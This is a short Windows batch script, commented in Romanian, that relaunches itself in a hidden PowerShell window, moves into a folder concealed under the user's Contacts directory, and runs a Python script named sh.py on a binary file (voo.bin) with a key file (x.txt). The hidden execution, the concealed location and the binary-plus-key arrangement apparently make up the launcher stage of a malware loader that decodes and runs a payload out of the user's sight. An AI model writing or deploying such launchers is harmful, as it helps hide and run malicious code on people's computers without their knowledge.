@echo off
if not "%~1"=="h" (
    powershell -windowstyle hidden -command "Start-Process '%~f0' -ArgumentList 'h' -WindowStyle Hidden"
    exit /b
)

set "d=%USERPROFILE%\Contacts\zo"

:: Rulează scriptul Python hidden
cd /d "%d%"
if exist "sh.py" if exist "voo.bin" if exist "x.txt" (
    python.exe sh.py -i voo.bin -k x.txt
)

exit /b 0
